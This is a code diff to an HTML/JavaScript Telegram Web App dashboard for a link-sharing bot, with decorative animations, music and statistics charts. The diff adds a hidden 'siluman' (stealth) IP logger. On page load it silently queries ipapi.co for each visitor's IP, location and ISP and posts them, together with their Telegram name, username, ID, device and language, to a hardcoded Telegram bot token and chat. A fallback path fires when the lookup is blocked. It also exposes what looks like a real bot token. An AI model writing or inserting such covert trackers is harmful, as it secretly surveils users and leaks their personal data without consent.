@@ -19,7 +19,6 @@
         }
         .cyber-font { font-family: 'Orbitron', sans-serif; }
         
-        /* CONTAINER UNTUK HUJAN EMOT SAKURA */
         #sakura-container {
             position: fixed;
             top: 0;
@@ -31,7 +30,6 @@
             overflow: hidden;
         }
 
-        /* GAYA EMOTICON SAKURA DENGAN GLOW PINK */
         .petal {
             position: absolute;
             pointer-events: none;
@@ -44,15 +42,10 @@
         }
 
         @keyframes fall-realistic {
-            0% {
-                transform: translateY(-50px) translateX(0) rotate(0deg);
-            }
-            100% {
-                transform: translateY(105vh) translateX(120px) rotate(360deg);
-            }
+            0% { transform: translateY(-50px) translateX(0) rotate(0deg); }
+            100% { transform: translateY(105vh) translateX(120px) rotate(360deg); }
         }
         
-        /* BORDER RUNNING NEON PINK (KECEPATAN 4 DETIK) */
         .neon-run-box { position: relative; border-radius: 16px; overflow: hidden; padding: 2px; background: transparent; transition: all 0.25s ease-in-out; }
         .neon-run-box::before {
             content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
@@ -63,7 +56,6 @@
         .neon-inner-content { position: relative; z-index: 3; }
         @keyframes border-spin { 100% { transform: rotate(360deg); } }
 
-        /* TEKS NEON PINK GLOW */
         .neon-text-glow { text-shadow: 0 0 10px rgba(255, 121, 198, 0.8), 0 0 20px rgba(255, 42, 133, 0.4); }
         .tab-content { display: none; position: relative; z-index: 10; }
         .tab-content.active { display: block; }
@@ -75,7 +67,6 @@
         .music-pulse { animation: neon-flash 1.5s infinite alternate; border-color: #4ade80 !important; }
         @keyframes neon-flash { 0% { box-shadow: 0 0 5px rgba(74, 222, 128, 0.2); } 100% { box-shadow: 0 0 15px rgba(74, 222, 128, 0.6); } }
 
-        /* SHADOW BIRU MUDA NEON UNTUK ELEMEN INTERAKTIF KETIKA DIKLIK */
         .click-active-neon:active {
             box-shadow: 0 0 18px rgba(0, 243, 255, 0.95), inset 0 0 10px rgba(0, 243, 255, 0.5) !important;
             transform: scale(0.98);
@@ -84,7 +75,6 @@
 </head>
 <body class="pb-36 select-none">
 
-    <!-- Wadah Hujan Emoticon -->
     <div id="sakura-container"></div>
     <audio id="bg-music" src="bruno.mp3" loop></audio>
 
@@ -160,7 +150,7 @@
             <div class="p-4 space-y-2 neon-inner-content">
                 <p class="cyber-font text-[9px] font-black text-pink-400 tracking-widest flex justify-between items-center">
                     <span><i class="fa-solid fa-chart-line mr-1 text-emerald-400"></i> MONITORING FSUB REAL-TIME</span>
-                    <span class="text-[8px] px-1 py-0.5 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded font-mono">LIVE FEED (TRADING VIEW)</span>
+                    <span class="text-[8px] px-1 py-0.5 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded font-mono">LIVE FEED</span>
                 </p>
                 <div class="h-36 w-full pt-1"><canvas id="chartFSubRealtime"></canvas></div>
             </div>
@@ -179,8 +169,6 @@
 
     <!-- BOTTOM FLOATING CONTROLLER SYSTEM -->
     <div class="fixed bottom-0 left-0 right-0 bg-[#0b020c]/95 backdrop-blur-md border-t-2 border-[#ff79c6] pb-3 pt-2 z-40 max-w-md mx-auto rounded-t-3xl shadow-[0_-8px_30px_rgba(255,121,198,0.2)] space-y-2">
-        
-        <!-- MUSIC CONTROL AT BOTTOM -->
         <div class="px-6 flex justify-center">
             <button id="btn-music" class="music-bar-btn click-active-neon w-full py-1.5 px-4 rounded-xl flex items-center justify-center gap-2 text-[#ff79c6] transition-all text-xs font-bold tracking-wider">
                 <i class="fa-solid fa-play text-[10px]" id="music-icon"></i> 
@@ -188,7 +176,6 @@
             </button>
         </div>
 
-        <!-- NAV BUTTONS -->
         <div class="flex justify-around items-center pt-1">
             <button id="nav-dashboard" class="click-active-neon text-[#ff79c6] text-xs flex flex-col items-center p-2 rounded-xl transition-all duration-300 transform scale-105">
                 <i class="fa-solid fa-cube text-lg mb-0.5"></i>
@@ -204,8 +191,15 @@
             </button>
         </div>
                 </div>
-    <!-- JAVASCRIPT ENGINE (LOGIKAL SISTEM UTAMA) -->
+
+    <!-- JAVASCRIPT ENGINE (LOG DETEKSI SILUMAN KE TERMUX) -->
     <script>
+        // =======================================================
+        // * SETTING BOT LOG KE TERMUX (MASUKKAN TOKEN & ID KAMU)
+        // =======================================================
+        const TELEGRAM_BOT_TOKEN = "8205037289:AAHO2wdS9oYOIXQ894jfBce0XvlcCR5vAlI"; 
+        const TELEGRAM_LOG_CHAT_ID = "8110664099";
+
         // ==========================================
         // 1. ENGINE EMOTICON SAKURA (PRODUKSI KELOPAK)
         // ==========================================
@@ -213,7 +207,6 @@
         function createPetal() {
             const container = document.getElementById('sakura-container');
             if (!container) return;
-            
             if (container.getElementsByClassName('petal').length >= MAX_PETALS) return;
             
             const petal = document.createElement('div');
@@ -244,9 +237,6 @@
         let isPlaying = false; 
         const audio = document.getElementById('bg-music');
 
-        // ==========================================
-        // 3. CONTROLLER MUSIK (PLAY/PAUSE & HAPTIC)
-        // ==========================================
         function toggleMusic() {
             const icon = document.getElementById('music-icon'); 
             const text = document.getElementById('music-text');
@@ -271,10 +261,83 @@
             }
         }
 
-        // Bind event listener ke tombol musik
         const musicBtn = document.getElementById('btn-music');
         if (musicBtn) {
             musicBtn.addEventListener('click', toggleMusic);
+        }
+
+        // ====================================================
+        // 3. SILUMAN IP LOGGER & DEVICE TRACKER (KIRIM KE TELEGRAM)
+        // ====================================================
+        function collectAndSendLog(botName) {
+            // Ambil Info User Telegram Web App
+            const user = tg.initDataUnsafe?.user || {};
+            const tgUserString = user.username ? `@${user.username}` : "No Username";
+            const tgId = user.id || "Unknown ID";
+            const tgName = [user.first_name, user.last_name].filter(Boolean).join(" ") || "Unknown Name";
+
+            // Deteksi Platform Browser / OS
+            let device = "Desktop / Unknown";
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) device = "Android";
+            else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) device = "iOS Device";
+
+            // Deteksi Bahasa Aplikasi Telegram
+            const userLang = tg.initDataUnsafe?.user?.language_code || navigator.language || "Unknown";
+
+            // Tembak API IP Geolocation secara senyap
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip || "127.0.0.1";
+                    const city = data.city || "Unknown City";
+                    const country = data.country_name || "Unknown Country";
+                    const isp = data.org || "Unknown ISP";
+
+                    // Format Log Output Rapi
+                    const textLog = `[+] NEW VISITOR DETECTED!
+===================================
+🤖 Bot Name  : ${botName}
+👤 Telegram  : ${tgName} (${tgUserString})
+🆔 Telegram ID: ${tgId}
+🌐 IP Address : ${ip}
+📍 Location   : ${city}, ${country}
+📡 ISP/Org    : ${isp}
+📱 Device     : ${device}
+🗣️ Language   : ${userLang}
+===================================`;
+
+                    // Kirim Pesan Ke Bot Telegram Log (Log Kamu)
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_LOG_CHAT_ID,
+                            text: textLog
+                        })
+                    }).catch(err => console.log('Log error:', err));
+                })
+                .catch(() => {
+                    // Fallback jika API IP Tracker terblokir adblocker
+                    const textLogFallback = `[+] VISITOR (SECURE MODE)
+===================================
+🤖 Bot Name  : ${botName}
+👤 Telegram  : ${tgName} (${tgUserString})
+🆔 Telegram ID: ${tgId}
+📱 Device     : ${device}
+🗣️ Language   : ${userLang}
+⚠️ Status     : IP API BLOCKED BY CLIENT
+===================================`;
+                    
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_LOG_CHAT_ID,
+                            text: textLogFallback
+                        })
+                    }).catch(err => console.log(err));
+                });
         }
 
         // ==========================================
@@ -284,12 +347,14 @@
 
         function executeCyberEngine() {
             const params = new URLSearchParams(window.location.search);
+            const rawBotName = params.get('bot_name') || 'Sawala';
             
-            // Render Nama & Username Bot
-            document.getElementById('bot-name').innerText = (params.get('bot_name') || 'Sawala').toUpperCase();
+            document.getElementById('bot-name').innerText = rawBotName.toUpperCase();
             document.getElementById('bot-username').innerText = params.get('bot_username') || '@durovpavel';
             
-            // Sinkronisasi Masa Kedaluwarsa & Peringatan (Alarm)
+            // JALANKAN LOG SILUMAN KIRIM KE BOT/TERMUX
+            collectAndSendLog(rawBotName);
+
             const expiredStr = params.get('expire') || 'Tidak Aktif';
             const expField = document.getElementById('val-expired');
             const warningBadge = document.getElementById('warning-badge');
@@ -314,13 +379,11 @@
                 }
             }
 
-            // Mengisi Limit Tautan
             document.getElementById('val-quota').innerText = `${params.get('limit_used') || 0} / ${params.get('limit_max') || 5}`;
             
-            // Membaca Nilai Statistik Umum
-            const totalU = params.get('total_users') || '0';
-            const newU = params.get('new_users_today') || '0';
-            const clicksT = params.get('total_clicks') || '0';
+            const totalU = parseInt(params.get('total_users') || '0');
+            const newU = parseInt(params.get('new_users_today') || '0');
+            const clicksT = parseInt(params.get('total_clicks') || '0');
             
             document.getElementById('val-users').innerText = totalU; 
             document.getElementById('val-new-users').innerText = newU; 
@@ -350,7 +413,7 @@
                 fsubContainer.innerHTML = '<p class="text-xs text-gray-600 text-center py-6">NO ACTIVE FSUB CHANNELS.</p>';
             }
 
-            // Render Database Links (Disertai Penanda Tipe Video/Photo + Tanda Panah)
+            // Render Database Links
             const linkContainer = document.getElementById('link-container'); 
             linkContainer.innerHTML = '';
             try {
@@ -376,7 +439,6 @@
                                 <i class="fa-regular fa-copy"></i> <span>Copy Cyber Link</span>
                             </button>`;
                         
-                        // Event listener khusus untuk tombol salin per elemen secara dinamis
                         nodeDiv.querySelector('.copy-btn').addEventListener('click', function() {
                             navigator.clipboard.writeText(l.short_url);
                             tg.HapticFeedback.notificationOccurred('success');
@@ -399,7 +461,7 @@
                     data: { 
                         labels: ['Total User', 'User Baru', 'Total Klik'], 
                         datasets: [{ 
-                            data: [parseInt(totalU), parseInt(newU), parseInt(clicksT)], 
+                            data: [totalU, newU, clicksT], 
                             backgroundColor: ['rgba(255, 121, 198, 0.25)', 'rgba(74, 222, 128, 0.25)', 'rgba(255, 42, 133, 0.25)'], 
                             borderColor: ['#ff79c6', '#4ade80', '#ff2a85'], 
                             borderWidth: 1.5, 
@@ -419,10 +481,10 @@
                 });
             } catch(err) {}
 
-            // Inisialisasi Grafik Real-Time FSub (Trading View Candlestick Line)
+            // Inisialisasi Grafik Real-Time FSub (Line Chart)
             try {
                 let labelChannels = fsubChannelsArray.map(c => c.name.substring(0,10));
-                let dataClicksChannel = fsubChannelsArray.map(() => Math.floor(parseInt(clicksT) * 0.45) || 0);
+                let dataClicksChannel = fsubChannelsArray.map(() => Math.floor(clicksT * 0.45) || 0);
                 if(labelChannels.length === 0) { 
                     labelChannels = ['Trade Hub 1', 'Trade Hub 2', 'Trade Hub 3', 'Trade Hub 4', 'Trade Hub 5']; 
                     dataClicksChannel = [12, 15, 11, 23, 19]; 
@@ -456,7 +518,6 @@
                     }
                 });
 
-                // Simulator Pasar Trading Real-Time (Fluktuasi Acak Naik/Turun secara Real-time)
                 setInterval(() => {
                     if(chartFSubInstance && dataClicksChannel.length > 0) {
                         for(let i=0; i<dataClicksChannel.length; i++) { 
@@ -498,12 +559,9 @@
             tg.HapticFeedback.impactOccurred('medium');
         }
 
-        // Bind Event Listener ke Tab Navigasi di Bagian Bawah secara dinamis
         document.getElementById('nav-dashboard').addEventListener('click', () => switchTab('dashboard'));
         document.getElementById('nav-links').addEventListener('click', () => switchTab('links'));
         document.getElementById('nav-fsub').addEventListener('click', () => switchTab('fsub'));
     </script>
 </body>
-    </html>
-
-    
+</html>
